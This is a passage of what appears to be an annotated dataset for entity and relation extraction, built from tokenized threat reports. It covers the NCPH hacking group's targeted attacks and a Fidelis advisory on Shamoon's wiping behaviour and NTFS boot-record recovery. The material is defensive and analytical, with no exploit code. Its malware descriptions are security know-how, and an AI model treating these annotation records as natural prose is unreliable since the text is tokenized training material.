"hacker", "sites", "reveals", "a", "connection", "with", "the", "Jiangsu", "province", "of", "China", "."], ["One", "domain", ",", "windowsupdates.net", ",", "is", "used", "in", "attacks", "and", "revolves", "to", "an", "IP", "address", "in", "the", "Sichuan", "province", "."], ["Meanwhile", ",", "the", "registrant", "\"", "zhaofeng", "network", "\"", "is", "reportedly", "based", "out", "of", "Jiangsu", ",", "not", "Sichuan", "."], ["Some", "of", "the", "WHOIS", "information", "clearly", "contains", "fraudulent", "information", "to", "presumably", "direct", "researchers", "away", "from", "the", "true", "identity", "and", "location", "of", "the", "attacker", "responsible", "for", "registering", "the", "hostile", "domain", "."], ["The", "connection", "to", "the", "Jiangsu", "and", "Sichuan", "provinces", "remains", "unclear", "."], ["8"], ["Concluding", "Comments", "Prior", "to", "Wicked", "Rose", "and", "NCPH", "hacker", "for", "hire", "attacks", "in", "2006", ",", "Chinese", "hackers", "are", "only", "known", "for", "their", "patriotic", "hacking", "."], ["This", "disturbing", "development", "reveals", "two", "critical", "threats", ":", "1", ")", "motives", "of", "Chinese", "hackers", "are", "changing", "2", ")"], ["Chinese", "hackers", "are", "regularly", "associated", "with", "sophisticated", "attacks", "as", "of", "2006", "."], ["Wicked", "Rose", "implicates", "himself", "in", "his", "early", "blog", "entries", "and", "website", "posts", "in", "2006", "and", "prior", "."], ["An", "unknown", "company", "or", "entity", "reportedly", "paid", "Wicked", "Rose", "for", "hacking", "at", "the", "rate", "of", "2,000", "RMB", "a", "month", ",", "about", "$", "250", "USD", "."], ["At", "this", "time", "Wicked", "Rose", "gave", "200", "RMB", "to", "NCPH", "hackers", "and", "kept", "the", "rest", "for", "himself", "."], ["Once", "targeted", "attacks", "took", "place", "the", "payment", "increased", "five", "-", "fold", "to", "5,000", "RMB", "monthly", "with", "$", "1,000", "a", "month", "going", "to", "NCPH", "hackers", "."], ["This", "is", "a", "significant", "amount", "of", "money", "in", "China", ",", "effectively", "paying", "hackers", "a", "full", "-", "time", "wage", "for", "part", "-", "time", "hacking", "."], ["Throughout", "the", "summer", "of", "2006", ",", "while", "Wicked", "Rose", "was", "not", "in", "school", ",", "over", "35", "zero", "-", "day", "attacks", ",", "proof", "-", "of", "-", "concept", "codes", ",", "and", "attacks", "against", "un", "-", "patched", "Microsoft", "Office", "vulnerabilities", "are", "discovered", "in", "the", "wild", "."], ["With", "Wicked", "Rose", "claiming", "responsibility", "for", "early", "attacks", "and", "the", "lead", "author", "of", "both", "GinWui", "and", "the", "NCPH", "hacking", "group", ",", "there", "is", "little", "doubt", "left", "as", "to", "his", "involvement", "in", "attacks", "to", "date", "."], ["By", "the", "end", "of", "2006", "attacks", "become", "increasingly", "sophisticated", "."], ["In", "one", "instance", "a", "popular"], ["PowerPoint", "file", "distributed", "during", "the", "Christmas", "holiday", "season", "for", "the", "last", "two", "years", "prior", "is", "used", "within", "a", "socially", "engineered", "attack", "upon", "one", "individual", "within", "an", "energy", "sector", "US", "based", "company", "."], ["The", "PowerPoint", "file", "is", "modified", "to", "include", "an", "exploit", "that", "silently", "installs", "malicious", "code", "."], ["This", "same", "individual", "receives", "another", "e", "-", "mail", "containing", "a", "Microsoft", "Word", "exploit", "."], ["In", "this", "case", "only", "one", "individual", "within", "the", "company", "is", "targeted", ",", "and", "with", "just", "two", "messages", "socially", "engineered", "for", "maximum", "success", "."], ["This", "is", "a", "much", "more", "targeted", "and", "stealthy", "approach", "for", "attacks", "compared", "to", "the", "earlier", "attacks", "performed", "by", "the", "group", "in", "the", "late", "spring", "of", "2006", "."], ["NCPH", "continues", "to", "be", "a", "significant", "threat", "going", "forth", "for", "several", "reasons", "."], ["1", "."], ["Attacks", "continue", "to", "take", "place", "in", "the", "wild", "and", "are", "very", "difficult", "to", "identify", "on", "a", "targeted", "basis", "."], ["Only", "the", "most", "sophisticated", "networks", "and", "system", "administrators", "are", "able", "to", "properly", "protect", "and", "capture", "hostile", "targeted", "attack", "files", "before", "an", "attack", "takes", "place", "."], ["2", "."], ["NCPH", "is", "a", "serious", "dedicated", "hacking", "group", "that", "is", "methodical", "and", "disciplined", "in", "their", "development", "of", "new", "exploits", "and", "attacks", "."], ["3", "."], ["NCPH", "is", "motivated", "by", "both", "the", "thrill", "and", "challenge", "of", "hacking", "and", "money", "as", "a", "motive", "."], ["4", "."], ["Attacks", "by", "the", "group", "are", "highly", "targeted", "and", "stealthy", ",", "very", "difficult", "to", "detect", "and", "remove", "."]]}, {"vertexSet": [[{"name": "November 1, 2012", "pos": [0, 4], "sent_id": 2, "type": "Time"}], [{"name": "2012-11-01", "pos": [0, 5], "sent_id": 5, "type": "Time"}], [{"name": "Shamoon", "pos": [1, 2], "sent_id": 6, "type": "Malware"}], [{"name": "Shamoon", "pos": [8, 9], "sent_id": 15, "type": "Malware"}], [{"name": "August 15, 2012", "pos": [23, 27], "sent_id": 15, "type": "Time"}], [{"name": "Kaspersky\u2019s", "pos": [20, 22], "sent_id": 17, "type": "Person"}], [{"name": "Securelist", "pos": [22, 23], "sent_id": 17, "type": "Organization"}], [{"name": "Shamoon", "pos": [9, 10], "sent_id": 18, "type": "Malware"}], [{"name": "General Dynamics Fidelis Cybersecurity Solutions", "pos": [11, 16], "sent_id": 18, "type": "Organization"}], [{"name": "Shamoon", "pos": [8, 9], "sent_id": 58, "type": "Malware"}], [{"name": "Shamoon", "pos": [15, 16], "sent_id": 61, "type": "Malware"}], [{"name": "Windows XP", "pos": [8, 10], "sent_id": 62, "type": "Software"}], [{"name": "Windows 2003", "pos": [11, 13], "sent_id": 62, "type": "Software"}], [{"name": "Windows 7", "pos": [15, 17], "sent_id": 62, "type": "Software"}], [{"name": "Windows 7", "pos": [8, 10], "sent_id": 63, "type": "Software"}], [{"name": "EnCase", "pos": [7, 8], "sent_id": 146, "type": "Software"}], [{"name": "EnCase", "pos": [10, 11], "sent_id": 147, "type": "Software"}], [{"name": "EnCase", "pos": [4, 5], "sent_id": 154, "type": "Software"}], [{"name": "EnCase", "pos": [10, 11], "sent_id": 156, "type": "Software"}], [{"name": "WinHex", "pos": [15, 16], "sent_id": 157, "type": "Software"}], [{"name": "XP/2003", "pos": [10, 11], "sent_id": 162, "type": "Software"}], [{"name": "Windows 7", "pos": [17, 19], "sent_id": 162, "type": "Software"}], [{"name": "Windows 2003", "pos": [6, 8], "sent_id": 171, "type": "Software"}], [{"name": "EnCase", "pos": [7, 8], "sent_id": 182, "type": "Software"}], [{"name": "EnCase", "pos": [13, 14], "sent_id": 187, "type": "Software"}], [{"name": "Shamoon", "pos": [11, 12], "sent_id": 199, "type": "Malware"}], [{"name": "Fidelis XPS Internal Sensor", "pos": [19, 23], "sent_id": 201, "type": "Software"}]], "labels": [{"r": "P33", "h": 3, "t": 4, "evidence": [15]}], "title": "201211FidelisShamoon", "sents": [["www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys"], ["+1", "800.652.4020", "Fidelis", "Threat", "Advisory", "#", "1007", "RECOVERING", "FROM", "SHAMOON"], ["November", "1", ",", "2012"], ["Document", "Status", ":"], ["Last", "Revised", ":", "FINAL"], ["2012", "-", "11", "-", "01", "Executive", "Summary"], ["The", "Shamoon", "malware", "has", "received", "considerable", "coverage", "in", "the", "past", "couple", "of", "months", "because", "of", "its", "destructive", "nature", "."], ["Despite", "assertions", "that", "it", "is", "the", "work", "of", "amateurs", ",", "it", "has", "had", "a", "major", "impact", "on", "companies", "believed", "to", "have", "been", "affected", "."], ["The", "basic", "functions", "of", "the", "malware", "are", "to", "infect", ",", "entrench", ",", "propagate", ",", "and", "wipe", "."], ["However", "because", "of", "the", "way", "the", "malware", "operates", "and", "how", "it", "is", "programmed", "to", "wipe", ",", "it", "can", "find", "itself", "being", "its", "own", "enemy", "."], ["It", "will", "wipe", "data", "found", "in", "the", "Documents", "and", "Settings", "folder", "and", "the", "System32", "folder", ",", "and", "then", "use", "a", "signed", "driver", "for", "disk", "access", "to", "start", "wiping", "at", "the", "disk", "level", "."], ["Because", "the", "operating", "system", "needs", "certain", "files", "in", "the", "System32", "folder", "to", "run", ",", "it", "was", "found", "that", "infected", "hosts", "will", "always", "restart", "before", "the", "malware", "can", "wipe", "completely", "at", "the", "disk", "level", "."], ["Due", "to", "this", "it", "was", "possible", "to", "make", "a", "complete", "recovery", "of", "Shamoon", "-", "infected", "file", "systems", "to", "the", "state", "they", "were", "in", "before", "the", "wiping", "made", "the", "OS", "unbootable", "and", "unreadable", "."], ["In", "fact", "the", "majority", "of", "files", "outside", "of", "the", "System32", "and", "Document", "and", "Settings", "folder", "are", "recoverable", "as", "well", ";", "this", "provided", "the", "opportunity", "for", "a", "successful", "and", "fruitful", "analysis", ",", "investigation", ",", "and", "remediation", "effort", "."], ["Threat", "Overview"], ["According", "to", "community", "write", "-", "ups", ",", "the", "Shamoon", "malware", "appears", "to", "have", "been", "deployed", "against", "a", "couple", "of", "entities", "on", "or", "about", "August", "15", ",", "2012", "."], ["The", "malware", "had", "self", "-", "propagating", "qualities", "and", "was", "designed", "to", "overwrite", "data", "on", "disks", "attached", "to", "or", "accessible", "from", "targeted", "systems", "."], ["The", "malware", "\u2019s", "functionality", ",", "briefly", "summarized", "below", ",", "was", "covered", "in", "some", "detail", "in", "community", "postings", ",", "such", "as", "Kaspersky", "\u2019s", "Securelist", "blog", "."], ["Analysis", "details", "and", "testing", "of", "an", "available", "sample", "of", "Shamoon", "by", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", "researchers", "revealed", "that", "the", "malware", "\u2019s", "wipe", "operations", "did", "not", "overwrite", "entire", "disks", ",", "but", "rather", "overwrote", "enough", "to", "prevent", "access", "to", "the", "affected", "file", "systems", ",", "along", "with", "substantial", "amounts", "of", "file", "data", "."], ["However", ",", "analysis", "indicated", "that", "some", "files", "were", "still", "intact", "after", "the", "malware", "\u2019s", "write", "operations", "and", "subsequent", "system", "reboot", "."], ["Users", "are", "granted", "permission", "to", "copy", "and/or", "distribute", "this", "document", "in", "its", "original", "electronic", "form", "and", "print", "copies", "for", "personal", "use", "."], ["This", "document", "can", "not", "be", "modified", "or", "converted", "to", "any", "other", "electronic", "or", "machine", "-", "readable", "form", "in", "whole", "or", "in", "part", "without", "prior", "written", "approval", "of", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", ","], ["Inc."], ["While", "we", "have", "done", "our", "best", "to", "ensure", "that", "the", "material", "found", "in", "this", "document", "is", "accurate", ",", "Fidelis", "makes", "no", "guarantee", "that", "the", "information", "contained", "herein", "is", "error", "free", "."], ["Threat", "Advisory", "#", "1007"], ["Rev.", "2012", "-", "11", "-", "01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", "Recovering", "From", "Shamoon"], ["Page", "1", "of", "9", "www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys"], ["+1", "800.652.4020"], ["Fidelis", "researchers", "surmised", "there", "might", "be", "a", "means", "of", "recovering", "file", "data", "from", "targeted", "systems", "from", "a", "forensic", "and", "investigative", "analysis", "point", "of", "view", "."], ["With", "this", "goal", "in", "mind", ",", "researchers", "tested", "several", "possible", "ways", "of", "restoring", "disk", "data", "critical", "to", "the", "access", "of", "the", "targeted", "disk", "\u2019s", "file", "system", "."], ["What", "follows", "is", "a", "brief", "description", "of", "what", "the", "sample", "of", "the", "Shamoon", "malware", "does", "and", "a", "description", "and", "results", "of", "researchers", "\u2019", "file", "system", "recovery", "efforts", "."], ["Shamoon", "Wiper", "Functionality", "Actions", ":", "-\u00ad\u2010", "-\u00ad\u2010"], ["-\u00ad\u2010", "-\u00ad\u2010", "-\u00ad\u2010", "-\u00ad\u2010", "-\u00ad\u2010", "-\u00ad\u2010", "-\u00ad\u2010", "-\u00ad\u2010", "-\u00ad\u2010", "Executes", "a", "copy", "of", "itself", "as", "a", "scheduled", "job"], ["Deletes", "the", "file", "created", "for", "the", "scheduled", "job", "Entrenches", "itself", "as", "a", "service", "Execution", "of", "the", "entrenched", "file", "results", "in", "a", "dropped", "driver"], ["The", "dropped", "driver", "is", "loaded", "and", "executed"], ["The", "dropped", "driver", "facilitates", "disk", "access"], ["The", "malware", "overwrites", "disk", "data", "to", "include", "the", "contents", "of", "\\\\Documents", "and", "Settings", "(", "user", "data", ")", "and", "\\\\Windows\\system32", "(", "system", "data", ")", "directories"], ["The", "malware", "eventually", "overwrites", "the", "disk", "\u2019s", "boot", "records", "(", "Master", "Boot", "Record", "(", "MBR", ")", "and", "Volume", "Boot", "Record", "(", "VBR", ")", ")"], ["(", "Note", ":", "Testing", "was", "accomplished", "on", "disks", "with", "one", "partition", ")"], ["The", "malware", "appears", "to", "target", "user", "data", "first"], [",", "then", "system", "data"], ["The", "nature", "of", "the", "overwrites", "is", "such", "that", "the", "malware", "writes", "only", "a", "certain", "amount", "of", "data", "to", "targeted", "files", ",", "starting", "at", "the", "files", "\u2019", "beginning", "(", "Offset", "0x0", ")", "and", "then", "writing", "a", "certain", "amount", "of", "data", "to", "other", "file", "locations"], ["Fidelis", "researcher", "observations", "included", "the", "following", ":", "o"], ["At", "some", "point", "during", "the", "writing", "(", "wiping", ")", "process", ",", "the", "targeted", "system", "tries", "to", "read", "file", "data", "that", "has", "been", "overwritten", ",", "prompting", "an", "attempt", "to", "restore", "the", "involved", "file", "o"], ["The", "system", "asks", "the", "user", "for", "media", "containing", "system", "files", "when", "it", "can", "not", "find", "the", "system", "files", "it", "is", "looking", "for", "o"], ["The", "targeted", "system", "eventually", "reboots", ",", "resulting", "an", "error", "on", "restart", "because", "of"], ["the", "overwritten", "boot", "records", "o"], ["The", "disks", "targeted", "in", "testing", "were", "not", "completely", "overwritten", ";", "there", "was", "still", "apparently", "viable", "file", "data", "on", "the", "targeted", "disks", "o"], ["The", "result", "of", "the", "malware", "\u2019s", "operation", "was", "the", "prevention", "of", "accessing", "the", "targeted", "file", "system", "Note", ":", "The", "Shamoon", "sample", "Fidelis", "researchers", "had", "available", "looked", "very", "similar", "to", "that", "detailed", "in", "community", "write", "-", "ups", "."], ["However", ",", "as", "of", "the", "date", "of", "publication", ",", "researchers", "were", "still", "analyzing", "the", "available", "sample", "."], ["Therefore", ",", "differences", "between", "the", "available", "sample", "and", "others", "available", "to", "the", "community", "may", "become", "apparent", "in", "the", "future", "."], ["Analysis", "and", "Testing", "Overview"], ["Fidelis", "initially", "approached", "the", "Shamoon", "analysis", "strictly", "from", "a", "perspective", "of", "determining", "what", "forensic", "artifacts", "could", "be", "recovered", "from", "a", "targeted", "system", "."], ["The", "goal", "was", "at", "least", "a", "partial", "Threat", "Advisory", "#", "1007"], ["Rev.", "2012", "-", "11", "-", "01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", "Recovering", "From", "Shamoon"], ["Page", "2", "of", "9", "www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys"], ["+1", "800.652.4020", "reconstruction", "of", "the", "events", "precipitating", "the", "Shamoon", "attack", ",", "and", "possibly", "using", "those", "events", "found", "on", "the", "targeted", "systems", "to", "determine", "a", "start", "of", "the", "attack", ",", "and", "a", "possible", "source", "."], ["Analysis", "revealed", "the", "possibility", "that", "some", "user", "data", "would", "be", "recovered", "as", "a", "side", "benefit", "to", "the", "forensic", "analysis", "process", "."], ["Three", "types", "of", "operating", "systems", "were", "used", "for", "testing", "purposes", ";", "all", "testing", "occurred", "on", "laptops", "."], ["The", "laptops", "were", "wiped", ",", "had", "the", "operating", "system", "installed", ",", "and", "then", "had", "the", "Shamoon", "malware", "executed", "on", "the", "system", "."], ["The", "three", "operating", "systems", "used", "for", "testing", "were", "Windows", "XP", ",", "Windows", "2003", ",", "and", "Windows", "7", "."], ["The", "malware", "executed", "with", "no", "issues", "except", "on", "Windows", "7", "."], ["The", "User", "Access", "Control", "(", "UAC", ")", "on", "the", "Windows", "7", "systems", "had", "to", "be", "turned", "off", "before", "the", "malware", "would", "execute", "and", "perform", "the", "wiping", "action", "as", "has", "been", "observed", "on", "other", "machines", "."], ["This", "has", "been", "noted", "by", "others", "in", "the", "community", "as", "well", ",", "specifically", "that", "Administrator", "access", "is", "needed", "for", "initially", "launching", "Shamoon", "."], ["Shamoon", "operation", "results", "in", "much", "of", "the", "data", "on", "the", "affected", "systems", "being", "overwritten", "with", "the", "fragmented", "image", "of", "a", "burning", "flag", "."], ["As", "has", "been", "detailed", "above", ",", "the", "wipe", "function", "will", "overwrite", "data", "within", "the", "Documents", "and", "Settings", "folder", "followed", "by", "the", "System32", "folder", ",", "and", "then", "it", "will", "start", "the", "physical", "disk", "access", "and", "start", "the", "wiping", "at", "the", "disk", "level", "."], ["If", "the", "system", "restarts", "before", "the", "malware", "has", "completed", "wiping", "the", "disk", "then", "much", "of", "the", "data", "can", "still", "be", "recovered", ":", "each", "of", "our", "tests", "showed", "the", "system", "did", "restart", "before", "the", "disk", "was", "completely", "wiped", "."], ["The", "amount", "wiped", "from", "the", "host", "will", "never", "be", "the", "same", "from", "system", "to", "system", ",", "mainly", "because", "the", "size", "of", "the", "disk", "and", "partitions", "will", "all", "need", "to", "be", "taken", "into", "account", "."], ["VBR", "and", "File", "System", "Recovery", "Strategies"], ["The", "following", "is", "the", "view", "of", "the", "wiped", "disk", "for", "each", "of", "the", "operating", "systems", "that", "we", "tested", ":", "Fig", "1", "."], ["Example", "of", "wiped", "of", "MBR", "and", "VBR", "wiped", "by", "Shamoon", "Malware", "."], ["Figure", "1", "was", "found", "at", "the", "MBR", "(", "Sector", "0", ")", "and", "the", "VBR", "(", "Sector", "63/56", "(", "XP", ",", "2003", ")", ",", "and", "2048/206848", "(", "7", ")", ")", "of", "each", "of", "the", "operating", "systems", "(", "As", "well", "as", "throughout", "the", "drive", ")", "."], ["Fidelis", "Threat", "Advisory", "#", "1007"], ["Rev.", "2012", "-", "11", "-", "01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", "Recovering", "From", "Shamoon"], ["Page", "3", "of", "9", "www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys"], ["+1", "800.652.4020", "researchers", "decided", "to", "look", "further", "into", "the", "drive", "and", "find", "if", "there", "was", "any", "possibility", "of", "recovering", "files", "or", "logs", "that", "would", "help", "illuminate", "what", "happened", "to", "the", "systems", ",", "and", "if", "any", "artifacts", "of", "the", "malware", "could", "be", "recovered", "."], ["Note", "on", "the", "VBR", ":", "VBR", "stands", "for", "Volume", "Boot", "Record", ",", "and", "is", "made", "up", "of", "the", "boot", "sector", "and", "bootstrap", "code", "."], ["The", "boot", "sector", "takes", "up", "1", "sector", "on", "the", "drive", ";", "the", "next", "6", "sectors", "on", "the", "drive", "are", "allocated", "for", "the", "bootstrap", "code", "."], ["In", "all", "16", "sectors", "are", "allocated", "in", "total", "for", "the", "VBR", "."], ["The", "VBR", "is", "created", "when", "a", "file", "system", "is", "created", "on", "a", "partition", "."], ["In", "this", "paper", "we", "will", "be", "covering", "the", "NTFS", "Boot", "Record", "."], ["The", "VBR", "is", "used", "to", "load", "machine", "code", "into", "RAM", "to", "start", "a", "program", "."], ["Normally", "this", "program", "is", "the", "operating", "system", "."], ["Keyword", "searches", "revealed", "that", "there", "were", "still", "files", "that", "would", "be", "recoverable", "on", "the", "system", "."], ["In", "particular", "it", "was", "found", "that", "registry", "files", "and", "headers", "were", "still", "on", "the", "disk", "."], ["After", "this", ",", "it", "was", "found", "that", "the", "Master", "File", "Table", "(", "MFT", ")", "was", "still", ",", "for", "the", "most", "part", ",", "intact", "."], ["Trying", "to", "avoid", "the", "long", "and", "laborious", "process", "of", "carving", "files", "from", "the", "disk", ",", "researchers", "decided", "that", "it", "would", "instead", "be", "worth", "the", "time", "to", "try", "and", "recover", "the", "file", "system", "."], ["When", "the", "Windows", "operating", "system", "is", "installed", "or", "an", "NTFS", "volume", "created", ",", "a", "backup", "copy", "of", "the", "VBR", "is", "written", "to", "the", "last", "sector", "of", "the", "volume", "."], ["This", "is", "a", "very", "important", "detail", ",", "as", "the", "forensic", "value", "of", "the", "VBR", "is", "substantial", "(", "See", "Figure", "2", ")", "."], ["The", "area", "that", "will", "contain", "the", "critical", "information", "is", "known", "as", "the", "Bios", "Parameter", "Block", "(", "BPB", ")", "."], ["With", "this", "information", "it", "is", "possible", "to", "rebuild", "the", "file", "system", "as", "it", "existed", "before", "the", "wipe", "."], ["Threat", "Advisory", "#", "1007"], ["Rev.", "2012", "-", "11", "-", "01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", "Recovering", "From", "Shamoon"], ["Page", "4", "of", "9", "www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys"], ["+1", "800.652.4020", "EB", "52", "90", "4E", "54", "46", "53", "20", "20", "20", "20", "00", "02", "08", "00", "00"], ["00", "00", "00"], ["00", "00"], ["F8", "00", "00", "3F", "00"], ["FF", "00", "3F", "00", "00", "00", "00", "00", "00"], ["00", "80", "00", "80", "00", "C0", "F8", "F8", "0D", "00", "00", "00", "00", "00", "00"], ["0C", "00", "00", "00", "00", "00", "8C", "8F", "DF", "00", "00", "00", "00", "00"], ["F6", "00", "00", "00"], ["01", "00", "00", "00"], ["26", "FA", "CA", "70", "02", "CB", "70", "44", "00", "00", "00", "00"], ["[", "\u2026", "Truncated", "for", "size", "\u2026", "]", "00", "00", "55", "AA", "EB", "52", "90", "\u2013", "Instruction", "to", "jump", "to", "boot", "code", "(", "Not", "necessary", "for", "our", "application", ")"], ["4E", "54", "46", "53", "20", "20", "20", "20", "\u2013", "OEM", "Name", "(", "NTFS", ")", "00", "02", "\u2013", "Bytes", "per", "sector", ",", "0x0200", "=", "512", "Bytes", "."], ["08"], ["\u2013", "Sectors", "per", "cluster", "=", "8", "F8", "\u2013", "Media", "descriptor", "(", "Not", "necessary", "for", "our", "application", ")", "C0", "F8", "F8", "0D", "00", "00", "00", "00"], ["\u2013", "Total", "sectors", "in", "file", "system", ",", "0x00DF8F8C0", "=", "234420416", "Sectors", "(", "Add", "on", "the", "sector", "location", "of", "VBR", "for", "actual", "end", "of", "the", "file", "system", ",", "in", "this", "example", "the", "VBR", "is", "at", "sector", "63", "therefore", "the", "total", "sectors", "in", "the", "file", "system", "are", "234420416", "+", "63", "=", "234420479", ")"], ["00", "00", "0C", "00", "00", "00", "00", "00"], ["\u2013", "Starting", "cluster", "of", "the", "MFT", ",", "0X000C0000", "=", "786432", "Clusters", "."], ["786432", "*", "8", "(", "Cluster", "size", ")", "+63", "(", "VBR", "Sector", ")", "="], ["6291519"], ["Sectors", "8C", "8F", "DF", "00", "00", "00", "00", "00"], ["\u2013", "Starting", "cluster", "of", "the", "MFT", "mirror", ",", "0x00DF8F8C", "=", "14651276", "."], ["14651276", "*", "8", "+", "63", "=", "117210271", "Sectors"], ["F6", "\u2013", "Size", "of", "MFT", "Entry", ",", "246", "."], ["01", "\u2013", "Index", "size", ",", "1", "."], ["26", "FA", "CA", "70", "02", "CB", "70", "44", "\u2013", "Serial", "number", "."], ["For", "more", "technical", "information", "on", "file", "systems", "and", "their", "forensic", "value", ",", "Brian", "Carrier", "\u2019s", "book", "File", "System", "Forensic", "Analysis", "is", "an", "invaluable", "tool", "."], ["Fig", "2", "."], ["Example", "of", "a", "broken", "down", "BPB", "found", "within", "the", "boot", "sector", "."], ["Just", "because", "the", "boot", "sector", "of", "the", "VBR", "is", "recoverable", "does", "n\u2019t", "mean", "that", "everything", "on", "the", "file", "system", "will", "be", "restored", "to", "normal", "."], ["If", "a", "file", "was", "wiped", "by", "the", "malware", "then", "it", "will", "still", "be", "wiped", ",", "or", "partially", "wiped", "."], ["However", "files", "that", "were", "n\u2019t", "wiped", "will", "be", "much", "easier", "and", "faster", "to", "recover", "then"], ["carving", "and", "the", "context", "of", "each", "file", "will", "be", "easy", "to", "interpret", "."], ["To", "recover", "or", "identify", "the", "backup", "VBR", "a", "search", "will", "need", "to", "be", "run", "across", "the", "image", "file", "."], ["It", "is", "preferable", "if", "the", "image", "file", "is", "a", "raw", "image", "as", "they", "are", "easier", "to", "edit", "then", "other", "image", "file", "formats", "."], ["The", "search", "was", "performed", "for", "the", "hex", "of", "the", "VBR", "file", "header", ",", "EB", "52", "90", "4E", "54", "46", "53"], ["(", "\u00ebR", "NTFS", ")", "."], ["A", "few", "hits", "were", "found", "throughout", "the", "drive", ",", "and", "it", "appeared", "that", "there", "were", "multiple", "empty", "VBR", "templates", "throughout", "the", "system", "(", "Shown", "in", "Figure", "3", ")", "."], ["The", "correct", "VBR", "will", "likely", "be", "the", "one", "with", "information", "filled", "in", "from", "offset", "10", "\u2013", "80", "(", "See", "Figure", "2", "to", "breakdown", ")", "."], ["During", "testing", "it", "was", "found", "that", "the", "last", "hit", "was", "normally", "the", "correct", "VBR", ",", "as", "this", "would", "be", "the", "VBR", "found", "at", "the", "end", "of", "the", "volume", "."], ["Threat", "Advisory", "#", "1007"], ["Rev.", "2012", "-", "11", "-", "01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", "Recovering", "From", "Shamoon"], ["Page", "5", "of", "9", "www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys"], ["+1", "800.652.4020", "Fig", "3", "."], ["Example", "of", "a", "blank", "VBR", "."], ["Note", ":"], ["On", "2003", "systems", "the", "boot", "backup", "is", "sometimes", "found", "halfway", "through", "the", "partition", ",", "a", "manual", "parsing", "of", "the", "file", "will", "need", "to", "be", "performed", "to", "confirm", "the", "VBR", "is", "legitimate", "for", "the", "partition", "."], ["Once", "the", "VBR", "was", "found", "we", "noted", "the", "offset", "and", "calculated", "the", "sector", "to", "locate", "the", "backup", "in", "our", "desired", "forensic", "program", "."], ["For", "the", "purposes", "of", "testing", "we", "used", "EnCase", "(", "v6.19.6", ")", "."], ["Once", "the", "sector", "of", "the", "backup", "VBR", "is", "known", ",", "EnCase", "was", "started", "and", "the", "image", "of", "the", "infected", "system", "was", "loaded", "."], ["Within", "disk", "view", "we", "located", "the", "backup", "VBR", "and", "right", "clicked", "to", "add", "a", "manual", "partition", "as", "an", "NTFS", "file", "system", "."], ["The", "partition", "was", "added", ",", "the", "MFT", "read", ",", "and", "the", "file", "system", "appeared", ":", "Threat", "Advisory", "#", "1007"], ["Rev.", "2012", "-", "11", "-", "01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", "Recovering", "From", "Shamoon"], ["Page", "6", "of", "9", "www.fidelissecurity.com", "www.threatgeek.com", "@FidSecSys"], ["+1", "800.652.4020", "Fig", "4", "."], ["File", "system", "recovered", "within", "EnCase", "."], ["With", "the", "file", "system", "restored", "some", "relevant", "artifacts", "can", "be", "located", "now", ",", "and", "an", "actual", "computer", "forensic", "examination", "can", "take", "place", "."], ["This", "recovery", "can", "be", "successful", "without", "the", "use", "of", "the", "EnCase", "suite", "of", "forensic", "software", "as", "well", "."], ["Using", "a", "hex", "editor", "of", "your", "choice", "to", "repair", "the", "image", ",", "in", "our", "testing", "WinHex", "(", "16.6", ")", "was", "used", "."], ["Find", "the", "file", "header", "of", "the", "backup", "VBR", "within", "a", "file", "editor", ",", "copy", "from", "the", "header", "to", "footer", "of", "the", "boot", "sector", ";", "the", "footer", "will", "always", "be", "55", "AA", "."], ["The", "size", "will", "be", "512", "bytes", "from", "header", "to", "footer", "."], ["Then", "depending", "on", "what", "operating", "system", "is", "being", "examined", "you", "can", "write", "the", "copied", "boot", "sector", "to", "the", "appropriate", "sector", "on", "the", "affected", "image", "."], ["Placing", "the", "boot", "sector", "into", "the", "correct", "location", "will", "be", "the", "trickiest", "part", "as", "incorrect", "placement", "will", "result", "in", "the", "file", "system", "not", "being", "recognized", "."], ["The", "boot", "sector", "should", "be", "placed", "at", "sector", "63/56", "for", "XP/2003", ",", "and", "at", "sector", "2048/206848", "for", "Windows", "7", "."], ["After", "this", "is", "complete", "you", "will", "be", "able", "to", "add", "the", "image", "into", "the", "forensic", "program", "."], ["If", "the", "file", "system", "is", "not", "recognized", "then", "it", "is", "possible", "that", "the", "MBR", "will", "need", "to", "be", "reconstructed", ",", "though", "this", "is", "unlikely", "."], ["Before", "rebuilding", "the", "MBR", "try", "adding", "the", "image", "as", "a", "volume", "and", "not", "as", "a", "disk", "."], ["Note", ":", "Other", "recovery", "techniques", "are", "certainly", "viable", "as", "well", "."], ["There", "are", "automated", "partition", "rebuilding", "tools", "available", ",", "though", "some", "of", "these", "rely", "on", "a", "valid", "MBR", "to", "work", "properly", "(", "In", "this", "case", "that", "would", "n\u2019t", "be", "feasible", ")", "."], ["Other", "options", "would", "be", "the", "fixboot", "command", "from", "the", "Windows", "Recovery", "Console", "found", "on", "a", "Windows", "OS", "disk", "."], ["What", "we", "have", "presented", "here", "are", "forensically", "sound", "methods", "that", "are", "easily", "repeatable", "and", "least", "damaging", "to", "the", "evidence", "/", "image", "."], ["Multiple", "Partition", "Recovery", "Strategies"], ["For", "testing", "purposes", "the", "system", "with", "Windows", "2003", "was", "set", "up", "with", "three", "different", "partitions", "."], ["We", "wanted", "to", "emulate", "the", "situation", "in", "which", "one", "would", "have", "multiple", "partitions", "on", "the", "computers", ",", "as", "is", "quite", "common", "."], ["Conceivably", "the", "malware", "should", "wipe", "all", "of", "these", "partitions", "as", "well", ",", "as", "has", "been", "seen", "within", "the", "code", "of", "the", "malware", "."], ["What", "we", "wanted", "to", "look", "at", "was", "the", "extent", "of", "the", "wiping", "on", "the", "partitions", "and", "whether", "the", "same", "techniques", "that", "were", "applied", "to", "a", "single", "partitioned", "drive", "would", "still", "apply", "on", "the", "multiple", "partitioned", "drive", "."], ["In", "theory", "each", "partition", "should", "be", "recoverable", ",", "as", "non", "-", "bootable", "partitions", "still", "create", "a", 